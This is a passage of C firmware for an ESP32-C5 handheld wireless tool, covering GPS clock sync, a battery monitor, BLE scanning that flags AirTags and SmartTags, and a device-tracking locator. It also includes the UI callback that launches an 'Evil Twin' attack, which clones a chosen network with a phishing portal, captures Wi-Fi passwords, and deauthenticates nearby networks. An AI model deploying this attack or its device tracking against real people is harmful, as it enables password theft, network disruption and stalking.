			token = strtok(NULL, ",");
			field++;
		}

		if (status == 'A' && yr > 0) {
			static bool s_clock_synced = false;
			if (!s_clock_synced) {
				struct tm t = {0};
				t.tm_year  = 100 + yr; // 2000+yr, minus 1900
				t.tm_mon   = mon - 1;
				t.tm_mday  = day;
				t.tm_hour  = hh;
				t.tm_min   = mm;
				t.tm_sec   = ss;
				t.tm_isdst = 0;
				setenv("TZ", "UTC0", 1);
				tzset();
				time_t epoch = mktime(&t);
				if (epoch != (time_t)-1) {
					struct timeval tv = { .tv_sec = epoch, .tv_usec = 0 };
					settimeofday(&tv, NULL);
					s_clock_synced = true;
					ESP_LOGI(TAG, "System clock synced from GPS: %04d-%02d-%02d %02d:%02d:%02d UTC",
					         2000+yr, mon, day, hh, mm, ss);
				}
			}
			return true;
		}
	}
	return false;
}

static void gps_task(void *arg)
{
	(void)arg;
	for (;;) {
		int len = uart_read_bytes(GPS_UART_NUM, (uint8_t *)gps_rx_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(200));
		if (len > 0) {
			gps_rx_buffer[len] = '\0';
			char *line = strtok(gps_rx_buffer, "\r\n");
			while (line != NULL) {
				parse_gps_nmea(line);
				line = strtok(NULL, "\r\n");
			}
		}
		vTaskDelay(pdMS_TO_TICKS(100));
	}
}

// === BATTERY VOLTAGE MONITOR IMPLEMENTATION ===
// Disabled - chip changed from Waveshare to regular ESP32-C5

#if 1  // Battery monitor enabled
static esp_err_t init_battery_adc(void)
{
    // Configure ADC unit
    adc_oneshot_unit_init_cfg_t init_cfg = {
        .unit_id = BATTERY_ADC_UNIT,
        .ulp_mode = ADC_ULP_MODE_DISABLE,
    };
    
    esp_err_t ret = adc_oneshot_new_unit(&init_cfg, &battery_adc_handle);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to create ADC unit: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Configure ADC channel
    adc_oneshot_chan_cfg_t chan_cfg = {
        .atten = BATTERY_ADC_ATTEN,
        .bitwidth = ADC_BITWIDTH_12,
    };
    
    ret = adc_oneshot_config_channel(battery_adc_handle, BATTERY_ADC_CHANNEL, &chan_cfg);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to configure ADC channel: %s", esp_err_to_name(ret));
        adc_oneshot_del_unit(battery_adc_handle);
        battery_adc_handle = NULL;
        return ret;
    }
    
    // Try to create calibration handle for more accurate readings
    adc_cali_curve_fitting_config_t cali_cfg = {
        .unit_id = BATTERY_ADC_UNIT,
        .chan = BATTERY_ADC_CHANNEL,
        .atten = BATTERY_ADC_ATTEN,
        .bitwidth = ADC_BITWIDTH_12,
    };
    
    ret = adc_cali_create_scheme_curve_fitting(&cali_cfg, &battery_adc_cali_handle);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "ADC calibration not available, using raw values");
        battery_adc_cali_handle = NULL;
    } else {
        ESP_LOGI(TAG, "ADC calibration enabled");
    }
    
    ESP_LOGI(TAG, "Battery ADC initialized on channel %d", BATTERY_ADC_CHANNEL);
    return ESP_OK;
}

static float read_battery_voltage(void)
{
    if (battery_adc_handle == NULL) {
        return 0.0f;
    }
    
    // Take multiple samples and average them for stability
    int32_t sum = 0;
    int valid_samples = 0;
    
    for (int i = 0; i < BATTERY_ADC_SAMPLES; i++) {
        int raw_value = 0;
        esp_err_t ret = adc_oneshot_read(battery_adc_handle, BATTERY_ADC_CHANNEL, &raw_value);
        if (ret == ESP_OK) {
            sum += raw_value;
            valid_samples++;
        }
    }
    
    if (valid_samples == 0) {
        return 0.0f;
    }
    
    int avg_raw = sum / valid_samples;
    
    // Convert raw ADC to voltage (12-bit ADC, ~3.3V reference with DB_12 attenuation)
    // Note: Calibration may not be available on all ESP32-C5 chips
    float voltage_mv;
    if (battery_adc_cali_handle != NULL) {
        int calibrated_mv = 0;
        adc_cali_raw_to_voltage(battery_adc_cali_handle, avg_raw, &calibrated_mv);
        voltage_mv = (float)calibrated_mv;
    } else {
        // Fallback: raw to voltage (12-bit, 3.3V ref)
        voltage_mv = (avg_raw / 4095.0f) * 3300.0f;
    }
    
    // Apply voltage divider ratio to get actual battery voltage
    float battery_voltage = (voltage_mv / 1000.0f) * BATTERY_VOLTAGE_DIVIDER_RATIO;
    
    return battery_voltage;
}

static void battery_monitor_task(void *arg)
{
    (void)arg;
    char voltage_str[32];
    
    // Initial delay to let UI stabilize
    vTaskDelay(pdMS_TO_TICKS(2000));
    
    for (;;) {
        float voltage = read_battery_voltage();
        
        // Format battery indicator; hide label entirely when no valid reading
        if (voltage < BATTERY_VOLTAGE_CRITICAL) {
            voltage_str[0] = '\0';  // No battery — hide label
        } else if (voltage > BATTERY_VOLTAGE_CHARGING) {
            snprintf(voltage_str, sizeof(voltage_str), LV_SYMBOL_CHARGE "");
        } else {
            snprintf(voltage_str, sizeof(voltage_str), LV_SYMBOL_BATTERY_FULL " %.2fV", voltage);
        }

        strncpy(last_voltage_str, voltage_str, sizeof(last_voltage_str) - 1);
        last_voltage_str[sizeof(last_voltage_str) - 1] = '\0';

        if (lvgl_mutex && xSemaphoreTake(lvgl_mutex, pdMS_TO_TICKS(100)) == pdTRUE) {
            if (battery_label != NULL && lv_obj_is_valid(battery_label)) {
                if (voltage_str[0] == '\0') {
                    lv_obj_add_flag(battery_label, LV_OBJ_FLAG_HIDDEN);
                } else {
                    lv_obj_clear_flag(battery_label, LV_OBJ_FLAG_HIDDEN);
                    lv_label_set_text(battery_label, voltage_str);
                }
            }
            xSemaphoreGive(lvgl_mutex);
        }
        
        vTaskDelay(pdMS_TO_TICKS(BATTERY_UPDATE_INTERVAL_MS));
    }
}
#endif  // Battery monitor disabled

static void evil_twin_start_btn_cb(lv_event_t *e)
{
    (void)e;

    if (!evil_twin_network_dd || !evil_twin_html_dd) {
        return;
    }

    if (evil_twin_network_count == 0 || evil_twin_html_count == 0) {
        if (evil_twin_status_label) {
            lv_label_set_text(evil_twin_status_label, "Cannot start: missing selections");
        }
        return;
    }

    int net_sel = lv_dropdown_get_selected(evil_twin_network_dd);
    int html_sel = lv_dropdown_get_selected(evil_twin_html_dd);

    if (net_sel < 0 || net_sel >= evil_twin_network_count ||
        html_sel < 0 || html_sel >= evil_twin_html_count) {
        if (evil_twin_status_label) {
            lv_label_set_text(evil_twin_status_label, "Invalid selection");
        }
        return;
    }

    const uint16_t *count_ptr = wifi_scanner_get_count_ptr();
    uint16_t total_count = count_ptr ? *count_ptr : 0;
    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();

    int record_index = evil_twin_network_map[net_sel];
    if (!records || record_index < 0 || record_index >= total_count) {
        if (evil_twin_status_label) {
            lv_label_set_text(evil_twin_status_label, "Selected network unavailable");
        }
        return;
    }

    char ssid[33];
    if (records[record_index].ssid[0]) {
        snprintf(ssid, sizeof(ssid), "%s", (const char *)records[record_index].ssid);
    } else {
        snprintf(ssid, sizeof(ssid), "%02X%02X%02X%02X%02X%02X",
                 records[record_index].bssid[0], records[record_index].bssid[1], records[record_index].bssid[2],
                 records[record_index].bssid[3], records[record_index].bssid[4], records[record_index].bssid[5]);
    }

    // Store SSID for event callback
    strncpy(evil_twin_current_ssid, ssid, sizeof(evil_twin_current_ssid) - 1);
    evil_twin_current_ssid[sizeof(evil_twin_current_ssid) - 1] = '\0';

    int html_index = evil_twin_html_map[html_sel];
    const char *html_name = wifi_attacks_get_sd_html_name(html_index);

    // Save target networks before starting attack
    wifi_scanner_save_target_bssids();

    // Get deauth targets for display
    target_bssid_t targets[MAX_TARGET_BSSIDS];
    int target_count = wifi_scanner_get_targets(targets, MAX_TARGET_BSSIDS);

    // Create new UI page
    create_function_page_base("Evil Twin Attack");

    // Create scrollable content container
    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30 - 45);  // Leave space for header and Exit button
    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 30);
    lv_obj_set_style_bg_color(content, ui_bg_color(), 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_pad_all(content, 8, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
    lv_obj_set_style_pad_row(content, 6, 0);

    // Evil Twin network deployed label
    evil_twin_ssid_label = lv_label_create(content);
    char ssid_text[80];
    snprintf(ssid_text, sizeof(ssid_text), "Evil Twin network deployed:\n  %s", ssid);
    lv_label_set_text(evil_twin_ssid_label, ssid_text);
    lv_obj_set_style_text_color(evil_twin_ssid_label, ui_text_color(), 0);
    lv_obj_set_width(evil_twin_ssid_label, lv_pct(100));

    // Other deauthenticated networks label
    lv_obj_t *deauth_header = lv_label_create(content);
    lv_label_set_text(deauth_header, "Other deauthenticated networks:");
    lv_obj_set_style_text_color(deauth_header, ui_text_color(), 0);

    // Build deauth network list
    evil_twin_deauth_list_label = lv_label_create(content);
    lv_obj_set_width(evil_twin_deauth_list_label, lv_pct(100));
    lv_label_set_long_mode(evil_twin_deauth_list_label, LV_LABEL_LONG_WRAP);
    lv_obj_set_style_text_color(evil_twin_deauth_list_label, ui_muted_color(), 0);
    
    static char deauth_list_text[512];
    deauth_list_text[0] = '\0';
    int shown = 0;
    for (int i = 0; i < target_count; i++) {
        // Skip the Evil Twin SSID itself
        if (strcmp(targets[i].ssid, ssid) == 0) {
            continue;
        }
        if (shown > 0) {
            strncat(deauth_list_text, "\n", sizeof(deauth_list_text) - strlen(deauth_list_text) - 1);
        }
        char entry[48];
        if (targets[i].ssid[0]) {
            snprintf(entry, sizeof(entry), "  - %s", targets[i].ssid);
        } else {
            snprintf(entry, sizeof(entry), "  - [Hidden]");
        }
        strncat(deauth_list_text, entry, sizeof(deauth_list_text) - strlen(deauth_list_text) - 1);
        shown++;
    }
    if (shown == 0) {
        strcpy(deauth_list_text, "  (none)");
    }
    lv_label_set_text(evil_twin_deauth_list_label, deauth_list_text);

    // Status header
    lv_obj_t *status_header = lv_label_create(content);
    lv_label_set_text(status_header, "Status:");
    lv_obj_set_style_text_color(status_header, ui_text_color(), 0);

    // Status list (scrollable)
    evil_twin_status_list = lv_list_create(content);
    lv_obj_set_size(evil_twin_status_list, lv_pct(100), 100);
    lv_obj_set_flex_grow(evil_twin_status_list, 1);  // Take remaining space
    lv_obj_set_style_bg_color(evil_twin_status_list, lv_color_make(20, 20, 20), 0);
    lv_obj_set_style_border_color(evil_twin_status_list, ui_accent_color(), 0);
    lv_obj_set_style_border_width(evil_twin_status_list, 1, 0);
    lv_obj_set_style_pad_all(evil_twin_status_list, 4, 0);

    // Exit button at the bottom
    lv_obj_t *exit_btn = lv_btn_create(function_page);
    lv_obj_set_size(exit_btn, 100, 35);
    lv_obj_align(exit_btn, LV_ALIGN_BOTTOM_MID, 0, -5);
    lv_obj_set_style_bg_color(exit_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(exit_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(exit_btn, 0, 0);
    lv_obj_set_style_radius(exit_btn, 8, 0);
    lv_obj_add_event_cb(exit_btn, deauth_quit_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *exit_label = lv_label_create(exit_btn);
    lv_label_set_text(exit_label, "Exit");
    lv_obj_set_style_text_color(exit_label, ui_text_color(), 0);
    lv_obj_center(exit_label);

    // Create event queue for Evil Twin UI events
    if (!evil_twin_event_queue) {
        evil_twin_event_queue = xQueueCreate(16, sizeof(evil_twin_event_data_t));
    } else {
        xQueueReset(evil_twin_event_queue);
    }

    // Register event callback
    wifi_attacks_set_evil_twin_event_cb(evil_twin_ui_event_callback);

    // Set HTML template
    if (html_name) {
        esp_err_t html_res = wifi_attacks_select_sd_html(html_index);
        if (html_res != ESP_OK) {
            // Add error to status list
            lv_obj_t *item = lv_list_add_text(evil_twin_status_list, "Failed to set portal template");
            lv_obj_set_style_text_color(item, lv_color_make(255, 100, 100), 0);
        }
    }

    // Ensure Karma mode is disabled for Evil Twin (enables WiFi password verification)
    wifi_attacks_set_karma_mode(false);

    // Start the attack
    esp_err_t start_res = wifi_attacks_start_evil_twin(ssid, NULL);
    if (start_res != ESP_OK) {
        lv_obj_t *item = lv_list_add_text(evil_twin_status_list, "Failed to start Evil Twin attack");
        lv_obj_set_style_text_color(item, lv_color_make(255, 100, 100), 0);
        wifi_attacks_set_evil_twin_event_cb(NULL);
        return;
    }

    show_touch_dot = false;
    if (touch_dot) {
        lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
    }
}

// ============================================================================
// Radio Mode Switching (WiFi <-> BLE)
// ============================================================================

/**
 * Ensure WiFi mode is active. If BLE is active, deinits BLE first.
 * Returns true if WiFi is ready to use.
 */
static bool ensure_wifi_mode(void)
{
    switch (current_radio_mode) {
        case RADIO_MODE_WIFI:
            // Already in WiFi mode
            return true;
            
        case RADIO_MODE_NONE:
            // Initialize WiFi
            ESP_LOGI(TAG, "Initializing WiFi...");
            esp_err_t ret = wifi_cli_init();
            if (ret != ESP_OK) {
                ESP_LOGE(TAG, "WiFi init failed: %d", ret);
                return false;
            }
            
            // Set WiFi country for extended channels
            wifi_country_t wifi_country = {
                .cc = "PH",
                .schan = 1,
                .nchan = 14,
                .policy = WIFI_COUNTRY_POLICY_AUTO,
            };
            esp_wifi_set_country(&wifi_country);
            apply_wifi_power_settings();

            current_radio_mode = RADIO_MODE_WIFI;
            wifi_initialized = true;
            ESP_LOGI(TAG, "WiFi initialized OK");
            return true;
            
        case RADIO_MODE_BLE:
            // Deinitialize BLE and switch to WiFi
            ESP_LOGI(TAG, "Switching from BLE to WiFi mode...");
            bt_nimble_deinit();
            current_radio_mode = RADIO_MODE_NONE;
            // Now initialize WiFi (recursive call with RADIO_MODE_NONE)
            return ensure_wifi_mode();
    }
    return false;
}

/**
 * Ensure BLE mode is active. If WiFi is active, deinits WiFi first.
 * Returns true if BLE is ready to use.
 */
static bool ensure_ble_mode(void)
{
    switch (current_radio_mode) {
        case RADIO_MODE_BLE:
            // Already in BLE mode
            return true;
            
        case RADIO_MODE_NONE:
            // Initialize BLE
            ESP_LOGI(TAG, "Initializing BLE (NimBLE)...");
            esp_err_t ret = bt_nimble_init();
            if (ret != ESP_OK) {
                ESP_LOGE(TAG, "BLE init failed: %d", ret);
                return false;
            }
            current_radio_mode = RADIO_MODE_BLE;
            ESP_LOGI(TAG, "BLE initialized OK");
            return true;
            
        case RADIO_MODE_WIFI: {
            // Deinitialize WiFi and switch to BLE
            ESP_LOGI(TAG, "Switching from WiFi to BLE mode...");
            esp_wifi_stop();
            esp_wifi_deinit();
            // STA netif is kept for reuse on WiFi re-init
            // AP netif is created/destroyed dynamically when needed
            wifi_initialized = false;
            current_radio_mode = RADIO_MODE_NONE;
            // Now initialize BLE (recursive call with RADIO_MODE_NONE)
            return ensure_ble_mode();
        }
    }
    return false;
}

// ============================================================================
// NimBLE BLE Scanner Functions
// ============================================================================

/**
 * Check if BLE device already found (by MAC address)
 */
static bool bt_is_device_found(const uint8_t *addr)
{
    for (int i = 0; i < bt_found_device_count; i++) {
        if (memcmp(bt_found_devices[i], addr, 6) == 0) {
            return true;
        }
    }
    return false;
}

/**
 * Find device index by MAC address in bt_devices array
 * Returns -1 if not found
 */
static int bt_find_device_index(const uint8_t *addr)
{
    for (int i = 0; i < bt_device_count; i++) {
        if (memcmp(bt_devices[i].addr, addr, 6) == 0) {
            return i;
        }
    }
    return -1;
}

/**
 * Add BLE device to found list
 */
static void bt_add_found_device(const uint8_t *addr)
{
    if (bt_found_device_count < BT_MAX_DEVICES) {
        memcpy(bt_found_devices[bt_found_device_count], addr, 6);
        bt_found_device_count++;
    }
}

/**
 * Reset BLE scan counters
 */
static void bt_reset_counters(void)
{
    bt_airtag_count = 0;
    bt_smarttag_count = 0;
    bt_found_device_count = 0;
    bt_device_count = 0;
    memset(bt_found_devices, 0, sizeof(bt_found_devices));
    memset(bt_devices, 0, sizeof(bt_devices));
}

/**
 * Format BLE MAC address to string
 */
static void bt_format_addr(const uint8_t *addr, char *str)
{
    sprintf(str, "%02X:%02X:%02X:%02X:%02X:%02X",
            addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);
}

/**
 * Check if manufacturer data indicates Apple AirTag/Find My device
 */
static bool bt_is_apple_airtag(const uint8_t *data, uint8_t len, bool has_name)
{
    if (len < 4) return false;
    
    // Check Company ID (Little Endian: 0x4C 0x00)
    uint16_t company_id = data[0] | (data[1] << 8);
    if (company_id != APPLE_COMPANY_ID) return false;
    
    // Check Find My device type (0x12)
    if (data[2] != APPLE_FIND_MY_TYPE) return false;
    
    // AirTags typically have 25-29 bytes of manufacturer data
    // and don't broadcast a device name (unlike iPhone/iPad)
    if (len >= 25 && len <= 29 && !has_name) {
        return true;
    }
    
    return false;
}

/**
 * Check if manufacturer data indicates Samsung SmartTag
 */
static bool bt_is_samsung_smarttag(const uint8_t *data, uint8_t len)
{
    if (len < 4) return false;
    
    // Check Company ID (Little Endian: 0x75 0x00)
    uint16_t company_id = data[0] | (data[1] << 8);
    if (company_id != SAMSUNG_COMPANY_ID) return false;
    
    // SmartTag uses SmartThings Find protocol
    uint8_t device_type = data[2];
    
    // SmartTag typical payload length is 22-28 bytes
    if ((device_type == 0x02 || device_type == 0x03) && len >= 20 && len <= 30) {
        return true;
    }
    
    return false;
}

/**
 * BLE GAP event callback for scanning
 */
static int bt_gap_event_callback(struct ble_gap_event *event, void *arg)
{
    if (event->type != BLE_GAP_EVENT_DISC) {
        return 0;
    }
    
    struct ble_gap_disc_desc *desc = &event->disc;

    // Dee Dee Detector — check every advertisement against watchlist,
    // regardless of whether BT Locator is also running.
    if (bt_lookout_is_active()) {
        char adv_name_buf[32] = "";
        struct ble_hs_adv_fields lk_fields;
        if (ble_hs_adv_parse_fields(&lk_fields, desc->data, desc->length_data) == 0
            && lk_fields.name && lk_fields.name_len > 0) {
            int nl = lk_fields.name_len < 31 ? lk_fields.name_len : 31;
            memcpy(adv_name_buf, lk_fields.name, nl);
        }
        bt_lookout_on_adv(desc->addr.val, desc->rssi,
                          adv_name_buf[0] ? adv_name_buf : NULL);
    }

    // MAC tracking mode - update RSSI for tracked device (BT Locator)
    if (bt_tracking_mode) {
        if (memcmp(desc->addr.val, bt_tracking_mac, 6) == 0) {
            bt_tracking_rssi = desc->rssi;
            bt_tracking_found = true;
        }
        return 0;
    }
    
    // Parse advertising data
    struct ble_hs_adv_fields fields;
    int rc = ble_hs_adv_parse_fields(&fields, desc->data, desc->length_data);
    if (rc != 0) {
        return 0;
    }
    
    // Check if this is a Scan Response packet (contains names more often)
    bool is_scan_response = (desc->event_type == BLE_HCI_ADV_RPT_EVTYPE_SCAN_RSP);
    
    // Check if device already seen
    bool already_seen = bt_is_device_found(desc->addr.val);
    
    // If already seen, only process scan responses to update names
    if (already_seen) {
        // Try to update name from scan response if we don't have one
        if (is_scan_response && fields.name != NULL && fields.name_len > 0) {
            int dev_idx = bt_find_device_index(desc->addr.val);
            if (dev_idx >= 0 && bt_devices[dev_idx].name[0] == '\0') {
                int name_len = fields.name_len < 31 ? fields.name_len : 31;
                memcpy(bt_devices[dev_idx].name, fields.name, name_len);
                bt_devices[dev_idx].name[name_len] = '\0';
            }
        }
        return 0;
    }
    
    // Add to found devices list
    bt_add_found_device(desc->addr.val);
    
    // Store device info
    if (bt_device_count < BT_MAX_DEVICES) {
        bt_device_info_t *dev = &bt_devices[bt_device_count];
        memcpy(dev->addr, desc->addr.val, 6);
        dev->addr_type = desc->addr.type;
        dev->rssi = desc->rssi;
        dev->name[0] = '\0';
        dev->company_id = 0;
        dev->is_airtag = false;
        dev->is_smarttag = false;
        
        // Extract device name if available
        bool has_name = (fields.name != NULL && fields.name_len > 0);
        if (has_name) {
            int name_len = fields.name_len < 31 ? fields.name_len : 31;
            memcpy(dev->name, fields.name, name_len);
            dev->name[name_len] = '\0';
        }
        
        // Check manufacturer data
        if (fields.mfg_data != NULL && fields.mfg_data_len >= 2) {
            dev->company_id = fields.mfg_data[0] | (fields.mfg_data[1] << 8);
            
            if (bt_is_apple_airtag(fields.mfg_data, fields.mfg_data_len, has_name)) {
                dev->is_airtag = true;
                bt_airtag_count++;
            }
            else if (bt_is_samsung_smarttag(fields.mfg_data, fields.mfg_data_len)) {
                dev->is_smarttag = true;
                bt_smarttag_count++;
            }
        }
        
        bt_device_count++;
    }
    
    return 0;
}

/**
 * Start BLE scanning
 */
static int bt_start_scan(void)
{
    struct ble_gap_disc_params scan_params = {
        .itvl = 0x60,             // 60ms interval
        .window = 0x60,           // 60ms window = continuous listening
        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .limited = 0,
        .passive = 0,             // ACTIVE scan - critical for Scan Response names
        .filter_duplicates = 0,   // We handle duplicates ourselves
    };
    
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &scan_params,
                          bt_gap_event_callback, NULL);
    return rc;
}

/**
 * Stop BLE scanning
 */
static void bt_stop_scan(void)
{
    ble_gap_disc_cancel();
}

/**
 * NimBLE host sync callback
 */
static void bt_on_sync(void)
{
    ESP_LOGI(TAG, "BLE Host synchronized");
    nimble_initialized = true;
}

/**
 * NimBLE host reset callback
 */
static void bt_on_reset(int reason)
{
    ESP_LOGE(TAG, "BLE Host reset, reason: %d", reason);
    nimble_initialized = false;
}

/**
 * NimBLE host task
 */
static void nimble_host_task(void *param)
{
    ESP_LOGI(TAG, "NimBLE host task started");
    nimble_port_run();
    nimble_port_freertos_deinit();
}

// Apply BLE TX power for the current power mode.
// Call only after NimBLE host sync (nimble_initialized == true); the controller
// must be running before esp_ble_tx_power_set() is valid.
// esp_ble_tx_power_set() is a controller-level API in esp_bt.h — it works
// regardless of whether the host stack is NimBLE or Bluedroid.
static void apply_ble_power_settings(void)
{
    if (!g_max_power_mode) return;
    // ESP_PWR_LVL_P9 = +9 dBm — highest level for ESP32-C5 BLE controller.
    // Set DEFAULT (connections), ADV (advertising), and SCAN (scan requests).
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV,     ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN,    ESP_PWR_LVL_P9);
    ESP_LOGI(TAG, "BLE TX power set to P9 (+9 dBm max)");
}

/**
 * Initialize NimBLE stack
 */
static esp_err_t bt_nimble_init(void)
{
    if (nimble_initialized) {
        return ESP_OK;
    }
    
    esp_err_t ret = nimble_port_init();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "NimBLE port init failed: %d", ret);
        return ret;
    }
    
    // Configure BLE host callbacks
    ble_hs_cfg.sync_cb = bt_on_sync;
    ble_hs_cfg.reset_cb = bt_on_reset;
    
    // Start NimBLE host task
    nimble_port_freertos_init(nimble_host_task);
    
    // Wait for sync (max 3 seconds)
    for (int i = 0; i < 30 && !nimble_initialized; i++) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    if (!nimble_initialized) {
        ESP_LOGE(TAG, "NimBLE failed to sync");
        return ESP_FAIL;
    }
    apply_ble_power_settings();

    return ESP_OK;
}

/**
 * Deinitialize NimBLE stack
 */
static void bt_nimble_deinit(void)
{
    if (!nimble_initialized) {
        return;
    }
    
    // Stop any active scanning
    bt_scan_active = false;
    bt_stop_scan();
    
    // Wait for scan task to finish
    if (bt_scan_task_handle != NULL) {
        for (int i = 0; i < 20 && bt_scan_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }
    
    // Stop NimBLE host task
    nimble_port_stop();
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Deinitialize NimBLE port
    nimble_port_deinit();
    
    nimble_initialized = false;
    ESP_LOGI(TAG, "NimBLE stopped");
}

/**
 * Stop BLE scanner
 */
static void bt_scan_stop(void)
{
    if (!bt_scan_active && bt_scan_task_handle == NULL) {
        return;
    }
    
    bt_scan_active = false;
    bt_stop_scan();
    
    // Wait for task to finish
    for (int i = 0; i < 40 && bt_scan_task_handle != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    if (bt_scan_task_handle != NULL) {
        vTaskDelete(bt_scan_task_handle);
        bt_scan_task_handle = NULL;
    }
    
    ESP_LOGI(TAG, "BLE scanner stopped.");
}

/**
 * Update BLE scan list UI with current results
 */
static void ble_scan_update_list(void)
{
    if (!ble_scan_list) return;
    
    // Clear existing items
    lv_obj_clean(ble_scan_list);
    
    for (int i = 0; i < bt_device_count; i++) {
        bt_device_info_t *dev = &bt_devices[i];
        char addr_str[18];
        bt_format_addr(dev->addr, addr_str);
        
        char item_text[80];
        const char *type_str = "";
        if (dev->is_airtag) {
            type_str = " AirTag";
        } else if (dev->is_smarttag) {
            type_str = " SmartTag";
        }
        
        if (dev->name[0] != '\0') {
            // Truncate name if too long
            char short_name[13];
            strncpy(short_name, dev->name, 12);
            short_name[12] = '\0';
            snprintf(item_text, sizeof(item_text), "%d %s%s %s", 
                     dev->rssi, short_name, type_str, addr_str);
        } else {
            snprintf(item_text, sizeof(item_text), "%d%s %s", 
                     dev->rssi, type_str, addr_str);
        }
        
        lv_obj_t *item = lv_label_create(ble_scan_list);
        lv_label_set_text(item, item_text);
        lv_obj_set_width(item, lv_pct(100));
        lv_obj_set_style_text_color(item, ui_text_color(), 0);
        lv_obj_set_style_text_font(item, &lv_font_montserrat_12, 0);  // Smaller font to fit more
        lv_obj_set_style_pad_ver(item, 1, 0);
        lv_label_set_long_mode(item, LV_LABEL_LONG_SCROLL_CIRCULAR);  // Scroll if too long
    }
}

/**
 * BT Locator tracking task - scan for specific device every 10 seconds
 */
static void bt_locator_tracking_task(void *pvParameters)
{
    (void)pvParameters;
    
    char mac_str[18];
    bt_format_addr(bt_tracking_mac, mac_str);
    ESP_LOGI(TAG, "BT Locator tracking %s (10s intervals)...", mac_str);
    
    while (bt_locator_tracking_active && bt_locator_ui_active) {
        // Reset tracking state for this scan cycle
        bt_tracking_found = false;
        bt_tracking_rssi = 0;
        
        int rc = bt_start_scan();
        if (rc != 0) {
            ESP_LOGE(TAG, "BT Locator scan start failed: %d", rc);
            break;
        }
        
        // Scan for 10 seconds, updating RSSI display periodically
        for (int i = 0; i < 100 && bt_locator_tracking_active && bt_locator_ui_active; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
            
            // Update UI every 500ms if device found
            if (i % 5 == 0 && bt_tracking_found) {
                bt_locator_needs_ui_update = true;
            }
        }
        
        bt_stop_scan();
        
        if (!bt_locator_tracking_active || !bt_locator_ui_active) {
            break;
        }
        
        // Update RSSI display
        if (bt_tracking_found) {
            snprintf(bt_locator_status_text, sizeof(bt_locator_status_text), 
                     "RSSI: %d", bt_tracking_rssi);
        } else {
            snprintf(bt_locator_status_text, sizeof(bt_locator_status_text), 
                     "Device not found");
        }
        bt_locator_needs_ui_update = true;
    }
    
    bt_tracking_mode = false;
    bt_locator_tracking_active = false;
    bt_locator_task_handle = NULL;
    ESP_LOGI(TAG, "BT Locator tracking stopped.");
    vTaskDelete(NULL);
}

/**
 * BT Locator exit callback - cleanup and return to menu
 */
static void bt_locator_exit_cb(lv_event_t *e)
{
    (void)e;
    
    // Stop tracking if running
    bt_locator_tracking_active = false;
    bt_tracking_mode = false;
    
    // Stop scan if running
    if (bt_scan_active && bt_scan_task_handle != NULL) {
        bt_scan_active = false;
    }
    
    // Wait for tasks to stop
    vTaskDelay(pdMS_TO_TICKS(300));
    
    // Clean up UI
    bt_locator_ui_active = false;
    bt_locator_list = NULL;
    bt_locator_status_label = NULL;
    bt_locator_rssi_label = NULL;
    bt_locator_mac_label = NULL;
    bt_locator_exit_btn = NULL;
    bt_locator_content = NULL;
    
    // Switch back to WiFi mode
    if (current_radio_mode == RADIO_MODE_BLE) {
        bt_nimble_deinit();
        current_radio_mode = RADIO_MODE_NONE;
    }
    
    // Return to Bluetooth screen
    show_bluetooth_screen();
}

/**
 * BT Locator device selected callback - start tracking selected device
 */
static void bt_locator_device_selected_cb(lv_event_t *e)
{
    int dev_idx = (int)(intptr_t)lv_event_get_user_data(e);
    
    if (dev_idx < 0 || dev_idx >= bt_device_count) return;
    
    bt_device_info_t *dev = &bt_devices[dev_idx];
    
    // Copy MAC address for tracking
    memcpy(bt_tracking_mac, dev->addr, 6);
    bt_tracking_rssi = dev->rssi;
    bt_tracking_found = false;
    bt_tracking_name[0] = '\0';
    if (dev->name[0] != '\0') {
        strncpy(bt_tracking_name, dev->name, sizeof(bt_tracking_name) - 1);
        bt_tracking_name[sizeof(bt_tracking_name) - 1] = '\0';
    }
    
    // Stop current scan if running
    if (bt_scan_active && bt_scan_task_handle != NULL) {
        bt_scan_active = false;
        vTaskDelay(pdMS_TO_TICKS(200));  // Wait for scan to stop
    }
    
    // Hide list, show tracking UI
    if (bt_locator_list) {
        lv_obj_add_flag(bt_locator_list, LV_OBJ_FLAG_HIDDEN);
    }
    if (bt_locator_status_label) {
        lv_label_set_text(bt_locator_status_label, "Tracking device...");
    }
    
    // Show RSSI and MAC labels
    if (bt_locator_rssi_label) {
        char rssi_text[32];
        snprintf(rssi_text, sizeof(rssi_text), "RSSI: %d", bt_tracking_rssi);
        lv_label_set_text(bt_locator_rssi_label, rssi_text);
        lv_obj_clear_flag(bt_locator_rssi_label, LV_OBJ_FLAG_HIDDEN);
    }
    if (bt_locator_mac_label) {
        char mac_text[48];
        char addr_str[18];
        bt_format_addr(bt_tracking_mac, addr_str);
